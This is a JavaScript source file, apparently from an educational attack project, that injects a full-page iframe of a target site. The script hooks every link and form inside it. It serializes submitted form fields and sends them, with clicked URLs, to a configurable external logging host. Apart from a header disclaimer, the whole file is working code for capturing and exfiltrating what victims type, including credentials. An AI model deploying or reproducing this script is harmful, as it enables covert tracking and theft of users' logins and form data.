/**
 * Configurable tracking script
 * @author Krzysztof Kotowicz <kkotowicz at gmail dot com>
 * @see http://blog.kotowicz.net
 *
 * THIS FILE IS PART OF THE PROJECT FOR EDUCATIONAL USE *ONLY*
 * ANY COMMERCIAL USE, E.G. FOR VULNERABILITY ASSESSMENT,
 * PENETRATION TESTING IS PROHIBITED - CONTACT THE AUTHOR FOR PERMISSION
 *
 * PERFORMING ACTUAL ATTACKS ON WEBSITES NOT OWNED BY YOU
 * USING THIS PROJECT IS PROHIBITED!
 *
 * To configure the tracker use script URL parameters like so:)
 * <script src="http://example.com/track.js?log=http%3A%2F%2Fwhatever%2Flog.php&amp;site=youtube.com"></script>
 *
 * Parameters:
 * log - external absolute URL used to log events performed on targetted site
 *       (defaults to log.php in the same location as track.js)
 * start - starting frame URL (e.g. targetted site home page)
 *       (defaults to current location without query params)
 * site - site id (optional) - used to enable logs from different sites simultaneously
 */
(function() {
	var scripts = document.getElementsByTagName('script');
	var myScript = scripts[ scripts.length - 1 ];
	var scriptUrl = myScript.src.replace(/\?.*/, '');
	var queryString = myScript.src.replace(/^[^\?]+\??/,'');
	var params = parseQuery(queryString);

	var startUrl = params.start || location.href.replace(/\?.*/,'');
	var logUrl = params.log || scriptUrl.replace(/\/track.js/, '/log.php');

	function parseQuery ( query ) {
	   var Params = new Object ();
	   if ( ! query ) return Params; // return empty object
	   var Pairs = query.split(/[;&]/);
	   for ( var i = 0; i < Pairs.length; i++ ) {
	      var KeyVal = Pairs[i].split('=');
	      if ( ! KeyVal || KeyVal.length != 2 ) continue;
	      var key = unescape( KeyVal[0] );
	      var val = unescape( KeyVal[1] );
	      val = val.replace(/\+/g, ' ');
	      Params[key] = val;
	   }
	   return Params;
	};

	function log(what) {
		what["_"] = Math.random(); // avoid caching
		if (params.site) {
			what.site = params.site;
		}
		try {
		    $.get(logUrl, what); // try with ajax first, but you might bet into cross domain issues
		} catch (e) {
			// image - will not work with e.g. adblock plus
			var i = new Image();
			i.src = logUrl + '?' + encodeURIComponent($.param(what));
			$(i).load(function() {$(this).remove();}).appendTo('body');
		}
	};

	var init = function() {
		$('<iframe>')
			.css({
				position: 'absolute',
				width: '100%',
				height: '100%',
				top: 0,
				left: 0,
				border: 0,
				background: '#fff'
				})
			.appendTo('body')
			.load(function() {
				var frame = this;
				// height = this.contentDocument.body.scrollHeight; // in case we need to resize frame

				// hijack links and forms
				$('body',this.contentDocument)
				.find('a')
					.click(function() {
						log({event:'click', 'href': this.href});
					})
				.end()
				.find('form')
					.submit(function() {
						log({event: 'form',
							 url: frame.contentDocument.location.href,
							 action: $(this).attr('action') || frame.contentDocument.location.href,
							 fields: $(this).serialize()
						   });
					})
				.end();
			})
			.attr('src', startUrl);

		log({event: 'start', 'url': startUrl});
	};

	function pollJQuery() {
		if (typeof(jQuery) !== 'undefined') {
			clearInterval(interval);
			init(); // we have jquery, init
		}
	}

	 //if the jQuery object isn't available
    if (typeof(jQuery) == 'undefined') {
    		// load it
    		var s = document.createElement('script');
    		s.src = "http://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js";
    		document.body.appendChild(s);
    		var interval = setInterval(pollJQuery, 200); // check every 200 ms
    } else {
    	init(); // init immediately
    }


})();